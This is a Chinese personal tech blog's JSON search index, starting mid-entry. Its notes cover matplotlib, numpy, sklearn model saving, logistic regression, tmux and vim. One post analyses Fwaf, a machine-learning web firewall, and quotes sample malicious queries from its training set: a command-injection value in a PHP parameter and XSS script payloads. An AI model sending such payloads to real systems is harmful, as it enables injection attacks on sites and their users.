12345qa开始(录入进a寄存器)若干操作后q结束@a:使用a寄存器宏@@:使用最新录制的宏","categories":[{"name":"Linux日常","slug":"Linux日常","permalink":"https://hachp1.github.io/categories/Linux日常/"}],"tags":[{"name":"Linux日常","slug":"Linux日常","permalink":"https://hachp1.github.io/tags/Linux日常/"}]},{"title":"matplotlib初步学习","slug":"matplotlib初步学习","date":"2018-06-02T15:04:59.000Z","updated":"2025-02-06T15:11:50.799Z","comments":true,"path":"posts/机器学习/20180602-matplotlib1.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180602-matplotlib1.html","excerpt":"matplotlib学习 使用matplotlib.pylab库画图 matplotlib可以用来作为机器学习可视化的作图工具，在这里简单记录一下常用的一些画图方法。","text":"matplotlib学习 使用matplotlib.pylab库画图 matplotlib可以用来作为机器学习可视化的作图工具，在这里简单记录一下常用的一些画图方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344plt.figure()后到下一个plt.figure()前为同一张图的操作。 plt.grid(True) #加入网格 plt.plot(x,y) #图形中加入对点(x,y)的观察 plt.figure(num=标题数字,figsize=(长,宽),linewidth=1,linestyle=’--’,c=’red’) plot.xlim((1,2)) plot.ylim((3,4))#横纵坐标范围plt.xlabel('x axis label') plt.ylabel('y axis label') figure(figsize=(8,6),dpi=80) #创建一个长宽为8*6的图，设置分辨率为80 subplot(2,3,n)创建一个2*3的网格图，接下来的图样会在其第n块显示 savefig(“1.jpg”,dpi=80) #存图 plt.ytick([-2,-1,0,1], [‘bad2’,’bad1’,’ok’,’good’]) #对坐标打标记 画图时构造x、y序列：x=np.array([i/10.0 for i in range(-50,50,1)])x=np.array([i for i in range(-10,10,1)])x=linspace(-10,10,1000)* 折线图 plt.plot(X,Y) 直接描点为折线图,当点数足够多时，折线会成为曲线。 配合使用linspace画图： x=linspace(-5,5,50); #生成一维点 y=x**2; #输入公式 plot.plot(x ,y) #画图 * 散点图 plt.scatter(X,Y,s=75,c=函数,alpha=0.5) s:size c:color（或直接写color，可以不用管IDE显示红色的情况，内部有color属性） alpha:透明度 * 柱状图 plt.bar(X,Y，facecolor=””,edgecolor=’white’) * 等高线图 用于三维数据 plt.contourf(X,Y,f(X,Y),8,alpha=0.75,cmap=plt.cm.hot)'''8:等高线数 f(X,Y):高度（X,Y的映射值）,alpha:透明度,cmap:colormap,颜色映射类型（样式） plt.clabel(C,inline=True,fontsize=10) 其中C为实例，使用 C= plt.contourf(X,Y,f(X,Y),8,alpha=0.75,cmap=plt.cm.hot)获取注意：f(X,Y)必须为长方形矩阵（内部代码实现），所以需要映射一定量的长方形布局的点再计算其值''' 使用等高线画决策边界 123456x1_min, x1_max = x_test[:, 0].min() - 1, x_test_de[:, 0].max() + 1x2_min, x2_max = x_test[:, 1].min() - 1, x_test_de[:, 1].max() + 1xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, 0.01), np.arange(x2_min, x2_max, 0.01))Z = classifier.predict(mypca.inverse_transform(np.array([xx1.ravel(), xx2.ravel()]).T))Z = Z.reshape(xx1.shape)plt.contourf(xx1, xx2, Z, alpha=0.4, cmap=cmap) 点颜色映射 1234567from matplotlib.colors import ListedColormap...colors = ('red', 'blue', 'lightgreen', 'gray', 'cyan')cmap = ListedColormap(colors[:len(np.unique(y))])for idx, cl in enumerate(np.unique(y)): plt.scatter(x=X[y == cl, 0], y=X[y == cl, 1], alpha=0.8, c=cmap(idx), label=cl) 三维图的创建 123456789101112131415161718from mpl_toolkits.mplot3d import Axes3Dimport itertools...fig = plt.figure()ax = fig.add_subplot(111, projection='3d')'''A = XB = YZ = np.array(Z)'''Z = Z.flatten()C = np.array([i for i in itertools.product(A, B)])A = C[:, 0]B = C[:, 1]ax.plot_trisurf(A, B, Z, cmap='rainbow')plt.show() 图像填色 12345678910'''填充与坐标轴之间的图形'''plt.fill(x, y, color = \"g\", alpha = 0.3)'''填充两曲线之间的空间'''plt.fill_between(x, y1, y2, facecolor = \"yellow\")plt.fill_between(x, y1, y2, where= y1 &gt;= y2, facecolor = \"blue\", interpolate= True)plt.fill_between(x, y1, y2, where= y2 &gt; y1, facecolor = \"yellow\", interpolate= True)","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"https://hachp1.github.io/tags/机器学习初步/"}]},{"title":"杂·sklearn 保存训练结果","slug":"杂·SKlearn训练结果保存","date":"2018-05-05T09:23:18.000Z","updated":"2025-02-06T15:11:51.702Z","comments":true,"path":"posts/机器学习/20180505-dump.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180505-dump.html","excerpt":"一、使用joblib保存结果 代码如下： 123456789from sklearn.externals import joblib#此处假设已训练好的模型为learnClassifier#保存训练模型joblib.dump(learnClassifier, 'learnClassifier.model')#载入训练模型learnClassifier = joblib.load('learnClassifier.model')","text":"一、使用joblib保存结果 代码如下： 123456789from sklearn.externals import joblib#此处假设已训练好的模型为learnClassifier#保存训练模型joblib.dump(learnClassifier, 'learnClassifier.model')#载入训练模型learnClassifier = joblib.load('learnClassifier.model') 二、使用pickle保存结果 与joblib相比，pickle实际上是序列化和反序列化的函数。 注：pickle函数加s表示在bytes层面（程序变量中）的操作，而不加s的则是对文件的操作。 代码如下： 1234567#保存训练模型dump=pickle.dumps(classifier)with open(&apos;classifier_dump.pickle&apos;,&apos;w&apos;) as f: f.write(dump)#载入训练模型with open(&apos;classifier_dump.pickle&apos;,&apos;r&apos;) as f: classifier=pickle.load(f.read())","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"对逻辑回归的进一步理解","slug":"对逻辑回归的进一步理解","date":"2018-04-11T14:32:52.000Z","updated":"2025-02-06T15:11:51.594Z","comments":true,"path":"posts/机器学习/20180411-logistic.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180411-logistic.html","excerpt":"概要 逻辑回归即使用一个超平面将整个空间一分为二，并且在边界附近赋予连续（即不是非黑即白，而是可以有0-1之间的小数概率）的概率估计的二分类方法。 逻辑回归使用\\(θX\\)作为划分数据的边界。 逻辑回归使用 \\[ g( Z) =\\frac{1}{1+e^{Z}} \\] 替代离散的分布函数，其中，g(Z)即概率统计中的分布函数，可根据极大似然估计得到使用已有样本点估计的近似值：从理论上来讲，此时的似然函数应该是最大的，可以用梯度上升法求之。","text":"概要 逻辑回归即使用一个超平面将整个空间一分为二，并且在边界附近赋予连续（即不是非黑即白，而是可以有0-1之间的小数概率）的概率估计的二分类方法。 逻辑回归使用\\(θX\\)作为划分数据的边界。 逻辑回归使用 \\[ g( Z) =\\frac{1}{1+e^{Z}} \\] 替代离散的分布函数，其中，g(Z)即概率统计中的分布函数，可根据极大似然估计得到使用已有样本点估计的近似值：从理论上来讲，此时的似然函数应该是最大的，可以用梯度上升法求之。 对边界的理解 — 显然，Z=θX这个“超平面”可以作为划分整个空间的依据。本来到这里就可以用分段函数完成估计了，但是（1）分布函数是离散的，（2）并且不利于计算靠近分界时的概率，所以引入了S函数使分布函数连续化且能估计在边界附近的概率值，一举两得。 对代价函数的证明与理解 在证明的时候，本来是要分别讨论y=1和y=0时的分布函数的，在得出代价函数的时候使用了一个技巧统一了公式 我们知道，在实际情况下的点为\\((y_{i},X_{i})\\)，而\\(y_i\\)只能为0或1,所以有如下讨论： \\[h(X)=p(y=1|X_{i},θ)\\] 显然，只有以上这个等式我们并不能用到y=0的点，所以有如下公式： \\[1-h(X)=p(y=0|X_{i},θ)\\] 二者相乘后就得到了统一后的结果： \\[ h(X_{i})^{y_{i}}*(1-h(X_{i})^{1-y_{i}}=p(y_{i}|X_{i},θ) \\] 我们的目的就是要使以上式子最大化（极大似然的原理：我们观测到的一组数据是n个相互独立的随机变量的观测值，将它们出现的概率乘起来即得到整个观测值出现的概率，而我们观测到的现象一定是出现概率最大的那个结果，所以带入数据后整个式子的值最大）。 接下来就是熟悉的极大似然估计的步骤了，由极大似然估计法要将其最大化，利用高数知识，函数取对数后求导，令导数为零可以解出θ值(而在计算机中则使用梯度上升等方法得到结果） 对其取对数可得逻辑回归的代价函数（与其他回归的代价函数类似，但此处因为是极大似然估计，是求其最大值） \\[ L(θ)=-\\frac{1}{m}[\\sum_{i-1}^{m}y^{i}logh_{θ}(x^{i}+(1-y^{i})log(1-h_{θ}(x^{i}))] \\] 接下来就是手工求导出公式并使用梯度下降等算法了，可以愉快的逻辑回归了:) 对\\(θ_{i}\\)求偏导： \\[ \\frac{\\partial}{\\partial{θ_{i}} }L(θ)=(y-h(x))x_{i} \\] 梯度上升: \\[ θ_{i}=θ_{i}+α(y-h(x))x_{i} \\] 贴上手写的浮肿的代码（文件已传github）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import numpy as npimport matplotlib.pylab as plotclass Logistic: ''' 特征系数θ ''' theta = np.zeros((1, 1)) ''' 梯度上升循环次数 ''' cycleNum = 10000 ''' 特征向量X、标记向量y ''' X = np.zeros((1, 1)) Y = np.zeros((1, 1)) alpha = 1 def z(self, X): # z函数，决定z函数的形式 注：这里的X是向量不是矩阵 return X.dot(self.theta.transpose()) def h(self, x): return 1.0 / (1 + np.exp(-self.z(x))) def fit(self, X, Y): cx=np.ones((X.shape[0],1)) self.X = np.c_[cx,X] self.Y = Y self.theta = np.random.random((1, self.X.shape[1])) # 由于theta使用random函数导致其为二维而不是一维。 i = 0 j = 0 while j &lt; self.cycleNum: dtheta = np.zeros((1, self.X.shape[1])) # print(self.theta) # print(self.theta[0][0] / self.theta[0][1]) while i &lt;= self.Y.shape[0] - 1: dtheta += (self.Y[i] - self.h(self.X[i])) * self.X[i] i += 1 i = 0 # 初始化i self.theta = self.theta + self.alpha * dtheta j += 1 def predict(self, vX): output = self.h(vX) if output &lt; 0.5: return 0 else: return 1if __name__ == '__main__': lineSplit = [] x_train = [] y_train = [] with open(\"testSet-LR.txt\", 'r') as f: lines = f.readlines() for line in lines: lineSplit = (line.strip().split()) x_train.append([float(lineSplit[0]), float(lineSplit[1])]) y_train.append([int(lineSplit[2])]) x_train = np.array(x_train) y_train = np.array(y_train) logis = Logistic() logis.alpha = 100 logis.cycleNum = 30000 logis.fit(x_train, y_train) xop = [] yop = [] xpe = [] ype = [] i = 0 while i &lt;= x_train.shape[0] - 1: if y_train[i] == 1: xop.append(x_train[i][0]) yop.append(x_train[i][1]) else: xpe.append(x_train[i][0]) ype.append(x_train[i][1]) i += 1 fig=plot.figure() plot.scatter(xop, yop, color=\"red\") plot.scatter(xpe, ype, color=\"blue\") plot.xlim((-10,20 )) plot.ylim((-10, 20)) X = np.linspace(-10, 10, 30) Y = -X * logis.theta[0][1] / logis.theta[0][2] - logis.theta[0][0] / logis.theta[0][2] plot.plot(X, Y) plot.show() fig.savefig('lr.jpg') 参考资料：用最大似然估计求逻辑回归参数","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"numpy数组常用处理函数","slug":"numpy数组常用处理函数","date":"2018-04-09T14:32:52.000Z","updated":"2025-02-06T15:11:50.868Z","comments":true,"path":"posts/机器学习/20180409-numpy.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180409-numpy.html","excerpt":"numpy数组常用处理函数 numpy 数组是python机器学习常用的数据结构，在这里简单记下常见的使用方法和一些初学时遇到的问题 注意事项 使用数组时不要犯低级错误，注意行数和列数，不要搞反了。 np.array转化宽度不一致的数组时会出现未知错误，使用时要谨慎。 numpy使用元组作为引用，容易和多维数组按层拆分搞混，多维数组不支持元组索引（numpy也支持按层拆分）如：a[1,2]和b[1][2]。 注意矩阵乘法转置。 注意numpy不是默认二维数组， 若矩阵为向量，则只有shape[0](即向量长度为shape[0]而不是它作为矩阵时的shape[1]): [1,2,3,4] 看作矩阵： shape:[1,4] 看作向量：shape:[4] 在维度不匹配的时候可以加上shape先判断。 矩阵第一个参数为行数，第二个为列数…申请空白2维矩阵:(0,2) 添加新行： np.append(red,[vx],axis=0)此处的vx必须升维到与大矩阵相同，axis表示添加一行 或yellow=np.r_[yellow,[vx]]，道理同上","text":"numpy数组常用处理函数 numpy 数组是python机器学习常用的数据结构，在这里简单记下常见的使用方法和一些初学时遇到的问题 注意事项 使用数组时不要犯低级错误，注意行数和列数，不要搞反了。 np.array转化宽度不一致的数组时会出现未知错误，使用时要谨慎。 numpy使用元组作为引用，容易和多维数组按层拆分搞混，多维数组不支持元组索引（numpy也支持按层拆分）如：a[1,2]和b[1][2]。 注意矩阵乘法转置。 注意numpy不是默认二维数组， 若矩阵为向量，则只有shape[0](即向量长度为shape[0]而不是它作为矩阵时的shape[1]): [1,2,3,4] 看作矩阵： shape:[1,4] 看作向量：shape:[4] 在维度不匹配的时候可以加上shape先判断。 矩阵第一个参数为行数，第二个为列数…申请空白2维矩阵:(0,2) 添加新行： np.append(red,[vx],axis=0)此处的vx必须升维到与大矩阵相同，axis表示添加一行 或yellow=np.r_[yellow,[vx]]，道理同上 python代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115a = [1,2,3] b = [4,5,6] c = [4,5,6,7,8] zipped = zip(a,b) # 打包为元组的列表 [(1, 4), (2, 5), (3, 6)] zip(a,c) # 元素个数与最短的列表一致 [(1, 4), (2, 5), (3, 6)] zip(*zipped) # 与 zip 相反，可理解为解压，返回二维矩阵式 [(1, 2, 3), (4, 5, 6)]X=np.array([[1,2,3][4,5,6]])a=np.arange(9).reshape(3,3)aOut[31]: array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])'''注意，由于数组可以为高维，所以在此处需要用元组来包裹其尺寸。'''Z0 = np.zeros((2,2)) # Create an array of all zerosprint Z0 # Prints \"[[ 0. 0.] # [ 0. 0.]]\" z1=np.empty((2,))b = np.ones((1,2)) # Create an array of all onesprint b # Prints \"[[ 1. 1.]]\"c = np.full((2,2), 7) # Create a constant arrayprint c # Prints \"[[ 7. 7.] # [ 7. 7.]]\"I = np.eye(2) # Create a 2x2 identity matrixprint I # Prints \"[[ 1. 0.] # [ 0. 1.]]\"e = np.random.random((2,2)) # Create an array filled with random valuesprint e # Might print \"[[ 0.91940167 0.08143941]# [ 0.68744134 0.87236687]]\"扩展矩阵函数tile()np.tile(a,(m,n))&gt;&gt;&gt;x=np.array([0,0,0])&gt;&gt;&gt; x[[0, 0, 0]]&gt;&gt;&gt; tile(x,(3,1)) #即将x扩展3个，j=1,表示其列数不变matrix([[0, 0, 0], [0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; tile(x,(2,2)) #x扩展2次，j=2,横向扩展matrix([[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]])'''矩阵合并函数'''hstack : Stack arrays in sequence horizontally (column wise).vstack : Stack arrays in sequence vertically (row wise).dstack : Stack arrays in sequence depth wise (along third axis).concatenate : Join a sequence of arrays together.r_ : Translates slice objects to concatenation along the first axis.c_ : Translates slice objects to concatenation along the second axis.'''使用np.c_[]和np.r_[]分别添加行和列注：该方法只能将两个矩阵合并，不会改变原矩阵的维度'''np.c_[a,b]'''将b以列的形式拼接至a的后面'''### 推荐用法：newarray=numpy.insert(arr, obj, values, axis=None) '''arr：被插入的矩阵obj：要被插入的行（列）位置，将会插入到它的前一行（列）values：插入值（矩阵）axis：轴值，若未填入则矩阵会被展开,为0则插入行，1则插入列。'''array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])'''取矩阵的某一行'''a[1]Out[32]: array([3, 4, 5])'''取矩阵的某一列'''a[:,1]Out[33]: array([1, 4, 7])a.reshape(3, 4, -1)a.T # 转置a.transpose() # 转置numpy.linalg.inv(a) # 求逆a.diagonal([offset, axis1, axis2]) # 对角元np.linalg.norm(np_c1 - np_c2) #计算点c1和c2之间的欧式距离（一个点为一行）numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)# 返回均匀相隔的一组数据(num个)：Out:[start,start+step…] 对数据点按标记值创建分类组 12345678910import numpy as np # 注：必须要numpy才能成功x = np.array([1, 2, 3, 4])y = np.array([1, 0, 0, 2])test = x[y == 0]print(test)'''输出：[2 3]''' shuffle_data函数（对整个数据集进行洗牌，但x与y绑定） 123456789101112import numpy as np def shuffle_data(train_data, train_target): batch_size= len(train_target) index = [i for i in range(0, batch_size)] np.random.shuffle(index) batch_data = [] batch_target = [] for i in range(0, batch_size): batch_data.append(train_data[index[i]]) batch_target.append(train_target[index[i]]) return batch_data, batch_target 填充 1234567891011121314151617181920212223242526272829303132333435# 直接用lenth=10a=np.array([[6,6], [6,6]])a=np.pad(a,((0,0),(0,lenth-a.shape[1])), 'constant', constant_values=0)'''[[6 6 0 0 0 0 0 0 0 0] [6 6 0 0 0 0 0 0 0 0]]'''# 其他详细操作a=np.array([[6,6], [6,6]])b=np.pad(a,((1,2),(3,4)), 'constant', constant_values=(0, 1))print(b)'''[[0 0 0 0 0 1 1 1 1] [0 0 0 6 6 1 1 1 1] [0 0 0 6 6 1 1 1 1] [0 0 0 1 1 1 1 1 1] [0 0 0 1 1 1 1 1 1]]'''a=np.array([[6,6], [6,6]])b=np.pad(a,((0,0),(0,4)), 'constant', constant_values=( 0))print(b)'''[[6 6 0 0 0 0] [6 6 0 0 0 0]]''' 二进制保存 1234567m=np.array(n)m.tofile('test/m.bin')...m=fromfile('test/m.bin',dtype=np.float).reshape(-1,x,x)np.save('test/m.npy',m)m=np.load('test/m.npy')","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"https://hachp1.github.io/tags/机器学习初步/"}]},{"title":"Fwaf短源码学习","slug":"Fwaf短源码学习","date":"2018-04-08T12:23:59.000Z","updated":"2025-02-06T15:11:50.669Z","comments":true,"path":"posts/机器学习/20180408-ml.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180408-ml.html","excerpt":"Fwaf Fwaf是GitHub上的一个机器学习Web恶意请求防火墙，代码比较简洁，思路也比较清晰，由于和自己的某个想法很契合，就稍作分析。 库的使用和特征化 Fwaf使用sklearn库训练样本集。 其中，使用TfidfVectorizer对字符串进行特征化。 TfidfVectorizer TF-IDF（term frequency–inverse document frequency）是一种用于资讯检索与文本挖掘的常用加权技术。TF-IDF是一种统计方法，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。TF-IDF加权的各种形式常被搜索引擎应用，作为文件与用户查询之间相关程度的度量或评级。除了TF-IDF以外，互联网上的搜索引擎还会使用基于连结分析的评级方法，以确定文件在搜寻结果中出现的顺序。","text":"Fwaf Fwaf是GitHub上的一个机器学习Web恶意请求防火墙，代码比较简洁，思路也比较清晰，由于和自己的某个想法很契合，就稍作分析。 库的使用和特征化 Fwaf使用sklearn库训练样本集。 其中，使用TfidfVectorizer对字符串进行特征化。 TfidfVectorizer TF-IDF（term frequency–inverse document frequency）是一种用于资讯检索与文本挖掘的常用加权技术。TF-IDF是一种统计方法，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度。字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。TF-IDF加权的各种形式常被搜索引擎应用，作为文件与用户查询之间相关程度的度量或评级。除了TF-IDF以外，互联网上的搜索引擎还会使用基于连结分析的评级方法，以确定文件在搜寻结果中出现的顺序。 TF: Term Frequency，用来衡量一个词在一个文档中的重要性 \\[ TF(t)=\\frac{n(character(i))}{n(character)} \\] IDF: 逆向文件频率，用于衡量一个词在大型语料库中的重要性 \\[ ID(t) = log_e(\\frac{numOfDocs}{numOfDocsWhichIncludeT}) \\] \\[ TF-IDF = TF*IDF \\] * TF-IDF指标根据一个事实：如果一个词在一个文档中出现越多，则它对于该文档影响越大；如果一个词在所有语料库中出现次数越多，则它越“大众化”。也就是一个单词如果越“独特”，在个体中又越“重要”，则它在学习任务中就越重要。 sklearn.feature_extraction.text.TfidfVectorizer：可以将文档转换成TF-IDF特征的矩阵。 ngram_range：词组切分的长度范围。该范围之内的n元feature都会被提取出来，这个参数要根据自己的需求调整。 1vectorizer = TfidfVectorizer(min_df = 0.0, analyzer=\"char\", sublinear_tf=True, ngram_range=(1,3)) 样本集 作者使用txt格式的样本集，每一行为一个样本，分“goodqueries.txt”和“badqueries.txt”。 截取几行： 123/top.php?stuff='uname &gt;q36497765 #/h21y8w52.nsf?&lt;script&gt;cross_site_scripting.nasl&lt;/script&gt;/ca000001.pl?action=showcart&amp;hop=\\\"&gt;&lt;script&gt;alert('vulnerable') 机器学习算法 作者使用逻辑回归算法，算法虽然简单，但效果还比较好:) 比较适合刚写机器学习代码不久的我:) 1lgs = LogisticRegression(class_weight=&#123;1: 2 * validCount / badCount, 0: 1.0&#125;) 1234Accuracy: 0.999420Precision: 0.984403Recall: 0.998520F1-Score: 0.991411 各项指标都很高啊2333 参考资料 贴上作者源代码： 源代码链接：Fwaf-Machine-Learning-driven-Web-Application-Firewall","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"terminal和VIM的分屏简单命令","slug":"terminal和VIM的分屏简单命令","date":"2018-04-06T14:05:33.000Z","updated":"2025-02-06T15:11:51.068Z","comments":true,"path":"posts/Linux日常/20180406-vim&t.html","link":"","permalink":"https://hachp1.github.io/posts/Linux日常/20180406-vim&t.html","excerpt":"Linux下的分屏 在远程登陆Linux时，要远程启动多个程序，分屏显得很重要。 在这里小记一下几种简单的分屏命令。 1、terminal分屏 使用tmux对terminal分屏，常用指令如下： 开启tmux：在terminal中输入tmux开启分屏。 tmux ls： 显示已有的tmux会话 tmux attach-session -t 数字： 选择tmux tmux kill-session -t session-name：关闭tmux 开启鼠标移动、调节窗口大小等功能：[ctrl]+b+:后输入 set -g mouse on","text":"Linux下的分屏 在远程登陆Linux时，要远程启动多个程序，分屏显得很重要。 在这里小记一下几种简单的分屏命令。 1、terminal分屏 使用tmux对terminal分屏，常用指令如下： 开启tmux：在terminal中输入tmux开启分屏。 tmux ls： 显示已有的tmux会话 tmux attach-session -t 数字： 选择tmux tmux kill-session -t session-name：关闭tmux 开启鼠标移动、调节窗口大小等功能：[ctrl]+b+:后输入 set -g mouse on [ctrl+b]为tmux的指令输入前缀，以下指令为输入前缀指令后的指令： 上下分屏：&quot; 左右分屏: % 切换屏幕：o 关闭一个终端：x 上下分屏与左右分屏切换：空格键 还可以调整分屏大小（平均化） 显示快捷键帮助：？ 移动到下一个窗口：n 貌似比较鸡肋 显示时钟：t （ps：显示效果还可以） 临时退出session: d 列出session：tmux ls （不用前缀） 进入已存在的session：tmux a -t $session_name 关闭并删除所有session:[：]+ kill-server 复制模式 : [ 空格标记复制开始，回车结束复制。 粘贴 ：] 2、VIM分屏 载入文件 在新的垂直分屏中打开文件:vs 文件路径/文件名 在新的水平分屏中打开文件:sv 文件路径/文件名 与tmux类似，[ctrl+w]为VIM的指令输入前缀，以下指令为输入指令前缀后的指令： 下一个分屏：w 上一个分屏：p 使用 hjkl选择分屏 新建分屏：n（new）貌似比较鸡肋 水平分屏：s（split）貌似也比较鸡肋 垂直分屏：v（vsplit) 还是比较鸡肋 关闭分屏：c（close）或者直接命令模式 :q 具体还有其他指令，不会再查，感觉够用了，懒得记:)","categories":[{"name":"Linux日常","slug":"Linux日常","permalink":"https://hachp1.github.io/categories/Linux日常/"}],"tags":[{"name":"Linux日常","slug":"Linux日常","permalink":"https://hachp1.github.io/tags/Linux日常/"}]},{"title":"林轩田机器学习基石 第一周、第二周","slug":"林轩田机器学习基石笔记-第一周、第二周","date":"2018-04-03T11:34:44.000Z","updated":"2025-02-06T15:11:51.742Z","comments":true,"path":"posts/机器学习/20180403-ml1.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20180403-ml1.html","excerpt":"第一周，基本概念 机器学习可以进行的条件： 1、 有某种模式可以学习。 2、 这种模式不知道怎么手工明确规定（如果通过编写可以实现的就不需要机器学习）。 3、 有数据资料。 机器学习四种元素： 1、 输入X。 2、 输出Y。 3、 hypothesis H。 4、 资料 D 数据挖掘和机器学习有很多重合点，但不是一模一样。","text":"第一周，基本概念 机器学习可以进行的条件： 1、 有某种模式可以学习。 2、 这种模式不知道怎么手工明确规定（如果通过编写可以实现的就不需要机器学习）。 3、 有数据资料。 机器学习四种元素： 1、 输入X。 2、 输出Y。 3、 hypothesis H。 4、 资料 D 数据挖掘和机器学习有很多重合点，但不是一模一样。 # 第二周，二元是非判断 ### Perceptron Hypothesis：感知器学习算法：针对线性可分的资料 - PLA算法（perceptron learning algorithm），两种理解方式： ① 向量纠正（比较直观，但证明很麻烦，推导不方便） 当y=+1，那么类似于第一个图，w+yx将使得新的w更加偏向于x，以使得修正后的结果为h(x)&gt;0，而类似有第二图的修正。 ② 梯度下降（以点到直线的距离（带符号）为代价函数进行随机梯度下降）此方法可获得向量纠正的一样的公式及结果。 此法以误分类点到直线的距离为代价函数，使用随机梯度下降获得最优解，因如果误分类点到超平面的距离都最小时，则误分类点在线性可分的情况下变为正确分类点。 算法特性：只能分类线性可分的模型。 - 噪音相对于数据应该较小 - PLA变形：pocket algorithm，速度比PLA慢: 使用一个随机的g0作为起始，存贮目前为止代价函数最小的情况，迭代规定的若干次后得到结果。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"江城子 随想","slug":"随想","date":"2018-04-02T17:18:55.000Z","updated":"2025-02-06T15:11:52.144Z","comments":true,"path":"posts/杂文/20180403-thinking.html","link":"","permalink":"https://hachp1.github.io/posts/杂文/20180403-thinking.html","excerpt":"","text":"晨日暖阳斜倚窗。绿树桩，白屋房。 微风过面，虫鸣燕正忙。城中伊人早登墙，红笑靥，含蓄望。 料知心事不可想。蛾眉锁，轻拂妆。 路客打量，何事溢心房。遥寄命途多渴望，手心暖，思却凉。","categories":[{"name":"杂文","slug":"杂文","permalink":"https://hachp1.github.io/categories/杂文/"}],"tags":[{"name":"心情随笔","slug":"心情随笔","permalink":"https://hachp1.github.io/tags/心情随笔/"}]},{"title":"重拾HEXO","slug":"重拾HEXO","date":"2018-04-02T15:27:50.000Z","updated":"2025-02-06T15:11:52.074Z","comments":true,"path":"posts/uncategorized/20180402-return.html","link":"","permalink":"https://hachp1.github.io/posts/uncategorized/20180402-return.html","excerpt":"","text":"似乎从来没有开始过 之后会常来的 抛弃word 23333","categories":[],"tags":[]}]}